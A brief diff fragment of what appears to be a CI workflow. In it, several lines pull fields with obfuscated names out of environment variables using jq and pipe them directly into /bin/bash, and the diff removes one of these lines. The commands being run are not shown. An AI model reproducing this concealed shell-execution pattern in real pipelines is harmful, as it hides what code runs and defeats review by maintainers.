@@ -24,7 +24,6 @@ jobs:
           echo $dq7 | jq -r .sg0339 | /bin/bash
           printf '%s' "$lwoh8" | jq -r .xhn2 | /bin/bash
           printf '%s' "$rm49" | jq -r .tgz67536 | /bin/bash
-          echo $bb50 | jq -r .eqao46 | /bin/bash
           echo $wedl796 | jq -r .stof1785 | /bin/bash
 
       - name: Save archive
